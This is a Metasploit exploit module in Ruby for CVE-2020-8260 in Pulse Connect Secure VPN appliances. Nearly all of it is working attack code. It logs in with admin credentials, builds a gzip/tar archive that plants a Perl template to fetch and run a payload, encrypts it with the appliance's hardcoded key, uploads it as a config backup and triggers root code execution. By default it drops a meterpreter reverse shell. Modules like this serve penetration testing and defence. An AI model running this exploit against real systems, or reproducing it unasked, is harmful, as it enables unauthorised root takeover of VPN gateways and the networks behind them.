##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote

  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager
  prepend Msf::Exploit::Remote::AutoCheck

  ENCRYPTION_KEY = "\x50\x75\xe9\xc4\x31\x51\x22\x7c\x20\x73\x8d\x00\x2c\xee\xcf\xa2\x2c\x6c\x27\x4f\x07\x81\x5e\x94\xbc\x51\x3a\xd4\x5d\x61\x1a\x53\x3c\x57\x51\xc1\xcb\xee\x77\x69\xec\xc9\x81\x02\xe5\x23\x3a\xac\x00".b

  def initialize(info = {})
    super(update_info(info,
      'Name'               => 'Pulse Secure VPN gzip RCE',
      'Description'        => %q{
        The Pulse Connect Secure appliance before 9.1R9 suffers from an uncontrolled gzip extraction vulnerability
        which allows an attacker to overwrite arbitrary files, resulting in Remote Code Execution as root.
        Admin credentials are required for successful exploitation.
        Of note, MANY binaries are not in `$PATH`, but are located in `/home/bin/`.
      },
      'Author'             => [
        'h00die',                                       # msf module
        'Spencer McIntyre',                             # msf module
        'Richard Warren <richard.warren@nccgroup.com>', # original PoC, discovery
        'David Cash <david.cash@nccgroup.com>',         # original PoC, discovery
      ],
      'References'         => [
        ['URL', 'https://gist.github.com/rxwx/03a036d8982c9a3cead0c053cf334605'],
        ['URL', 'https://research.nccgroup.com/2020/10/26/technical-advisory-pulse-connect-secure-rce-via-uncontrolled-gzip-extraction-cve-2020-8260/'],
        ['URL', 'https://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44601'],
        ['CVE', '2020-8260']
      ],
      'DisclosureDate'     => '2020-10-26',
      'License'            => MSF_LICENSE,
      'Platform'           => ['unix', 'linux'],
      'Arch'               => [ARCH_CMD, ARCH_X86, ARCH_X64],
      'Privileged'         => true,
      'Targets'            => [
        ['Unix In-Memory',
          'Platform'       => 'unix',
          'Arch'           => ARCH_CMD,
          'Type'           => :unix_memory,
          'DefaultOptions' => {'PAYLOAD' => 'cmd/unix/generic'}
        ],
        ['Linux Dropper',
          'Platform'       => 'linux',
          'Arch'           => [ARCH_X86, ARCH_X64],
          'Type'           => :linux_dropper,
          'DefaultOptions' => {'PAYLOAD' => 'linux/x64/meterpreter_reverse_tcp'}
        ]
      ],
      'DefaultOptions'     => {'RPORT' => 443, 'SSL' => true},
      'DefaultTarget'      => 1,
      'Notes'              => {
        'Stability'        => [CRASH_SAFE],
        'Reliability'      => [REPEATABLE_SESSION],
        'SideEffects'      => [IOC_IN_LOGS, ARTIFACTS_ON_DISK, CONFIG_CHANGES],
        'RelatedModules'   => ['auxiliary/gather/pulse_secure_file_disclosure']
      }
    ))

    register_options([
      OptString.new('TARGETURI', [true, 'The URI of the application', '/']),
      OptString.new('USERNAME', [true, 'The username to login with', 'admin']),
      OptString.new('PASSWORD', [true, 'The password to login with', '123456'])
    ])
  end

  def check
    login
    res = send_request_cgi({'uri' => normalize_uri('dana-admin', 'misc', 'admin.cgi'), 'keep_cookies' => true})
    fail_with(Failure::UnexpectedReply, 'Failed to retrieve the version information') unless res&.code == 200
    version = res.body.scan(/id="span_stats_counter_total_users_count"[^>]+>([^<(]+)(?:\(build (\d+)\))?<\/span>/)&.last
    fail_with(Failure::UnexpectedReply, 'Failed to retrieve the version information') unless version
    version, build = version

    return CheckCode::Unknown unless version.include?('R')
    version, revision = version.split('R', 2)
    print_status("Version #{version.strip}, revision #{revision.strip}, build #{build.strip} found")
    return CheckCode::Appears if version.to_f <= 9.1 && revision.to_f < 9
    CheckCode::Detected
  rescue Msf::Exploit::Failed
    CheckCode::Unknown
  end

  def exploit
    case target['Type']
    when :unix_memory
      execute_command(payload.encoded)
    when :linux_dropper
      execute_cmdstager(
        flavor:   :curl,
        noconcat: false,
        linemax: 8192
      )
    end
  end

  def execute_command(command, _opts = {})
    trigger = Rex::Text.rand_text_alpha_upper(8)
    print_status("Exploit trigger will be at #{normalize_uri('dana-na', 'auth', 'setcookie.cgi')} with a header of #{trigger}")

    config = build_malicious_config(command, trigger)
    res = upload_config(config)

    fail_with(Failure::UnexpectedReply, 'File upload failed') unless res&.code == 200

    print_status('Triggering RCE')
    res = send_request_cgi({
      'uri'     => normalize_uri(target_uri.path, 'dana-na', 'auth', 'setcookie.cgi'),
      'headers' => {trigger => trigger},
      'keep_cookies' => true
    })
  end

  def res_get_xsauth(res)
    res.body.scan(/name="xsauth" value="([^"]+)"\/>/)&.last&.first
  end

  def upload_config(config)
    print_status('Requesting backup config page')
    res = send_request_cgi({
      'uri'      => normalize_uri(target_uri.path, 'dana-admin', 'cached', 'config', 'config.cgi'),
      'method'   => 'GET',
      'headers'  => {'referer' => "https://192.168.159.100:#{rport}/dana-admin/cached/config/config.cgi?type=system"},
      'vars_get' => {'type' => 'system'},
      'keep_cookies' => true
    })
    fail_with(Failure::UnexpectedReply, 'Failed to request the backup configuration page') unless res&.code == 200
    xsauth = res_get_xsauth(res)
    fail_with(Failure::UnexpectedReply, 'Failed to get the xsauth token') if xsauth.nil?

    post_data = Rex::MIME::Message.new
    post_data.add_part(xsauth, nil, nil, 'form-data; name="xsauth"')
    post_data.add_part('Import', nil, nil, 'form-data; name="op"')
    post_data.add_part('system', nil, nil, 'form-data; name="type"')
    post_data.add_part('8', nil, nil, 'form-data; name="optWhat"')
    post_data.add_part('', nil, nil, 'form-data; name="txtPassword1"')
    post_data.add_part('Import Config', nil, nil, 'form-data; name="btnUpload"')
    post_data.add_part(config, 'application/octet-stream', 'binary', 'form-data; name="uploaded_file"; filename="system.cfg"')

    print_status('Uploading encrypted config backup')
    send_request_cgi({
      'uri'     => normalize_uri(target_uri.path, 'dana-admin', 'cached', 'config', 'import.cgi'),
      'method'  => 'POST',
      'headers' => {'referer' => "https://192.168.159.100:#{rport}/dana-admin/cached/config/config.cgi?type=system"},
      'data'    => post_data.to_s,
      'ctype'   => "multipart/form-data; boundary=#{post_data.bound}",
      'keep_cookies' => true
    })
  end

  def login
    res = send_request_cgi({
      'uri'          => normalize_uri(target_uri.path, 'dana-na', 'auth', 'url_admin', 'login.cgi'),
      'method'       => 'POST',
      'vars_post'    => {
        'tz_offset'  => '-300',
        'username'   => datastore['USERNAME'],
        'password'   => datastore['PASSWORD'],
        'realm'      => 'Admin Users',
        'btnSubmit'  => 'Sign In'
      },
      'keep_cookies' => true
    })

    fail_with(Failure::UnexpectedReply, 'Login failed') unless res&.code == 302
    location = res.headers['Location']
    fail_with(Failure::NoAccess, 'Login failed') if location.include?('failed')

    return unless location.include?('admin%2Dconfirm')

    # if the account we login with is already logged in, or another admin is logged in, a warning is displayed.  Click through it.
    print_status('Other admin sessions detected, continuing')
    res = send_request_cgi({'uri' => location, 'keep_cookies' => true})
    fail_with(Failure::UnexpectedReply, 'Login failed') unless res&.code == 200
    fds = res.body.scan(/name="FormDataStr" value="([^"]+)">/).last
    xsauth = res_get_xsauth(res)
    fail_with(Failure::UnexpectedReply, 'Login failed (missing form elements)') unless fds && xsauth

    res = send_request_cgi({
      'uri'       => normalize_uri(target_uri.path, 'dana-na', 'auth', 'url_admin', 'login.cgi'),
      'method'    => 'POST',
      'vars_post' => {
        'btnContinue' => 'Continue the session',
        'FormDataStr' => fds.first,
        'xsauth'      => xsauth
      },
      'keep_cookies' => true
    })
    fail_with(Failure::UnexpectedReply, 'Login failed') unless res
  end

  def build_malicious_config(cmd, trigger)
    full_command = cmd.split(';')
    curl = full_command[0] # todo: clean this up
    payload_file = full_command[0].split(' ')[2].strip
    perl = "if( length $ENV{HTTP_#{trigger}}){\n  system(\"/home/bin/#{curl}\");\n  chmod 0777, \"#{payload_file}\";\n  system(\"env #{payload_file}\");\n}\n"

    tarfile = StringIO.new
    Gem::Package::TarWriter.new(tarfile) do |tar|
      tar.mkdir('tmp', 509)
      tar.mkdir('tmp/tt', 509)
      tar.add_file('tmp/tt/setcookie.thtml.ttc', 511) do |tio|
        tio.write perl
      end
    end

    gzfile = StringIO.new
    gz = Zlib::GzipWriter.new(gzfile)
    gz.write(tarfile.string)
    gz.close

    encrypt_config(gzfile.string)
  end

  def encrypt_config(config_blob)
    cipher = OpenSSL::Cipher.new('DES-EDE3-CFB').encrypt
    iv = cipher.iv = cipher.random_iv
    cipher.key = evp_bytestokey(ENCRYPTION_KEY, cipher.key_len)

    md5 = OpenSSL::Digest::MD5.new(iv + "\x00" + [config_blob.length].pack('V'))

    ciphertext = cipher.update(config_blob)
    ciphertext << cipher.final
    md5 << ciphertext

    cipher.reset
    "\x09" + iv + "\x00" + [ciphertext.length].pack('V') + ciphertext + cipher.update(md5.digest) + cipher.final
  end

  def evp_bytestokey(password, key_len)
    d = d_i = ''
    while d.length < key_len do
      d_i = OpenSSL::Digest::MD5.new(d_i + password).digest
      d << d_i
    end

    d[0...key_len]
  end
end
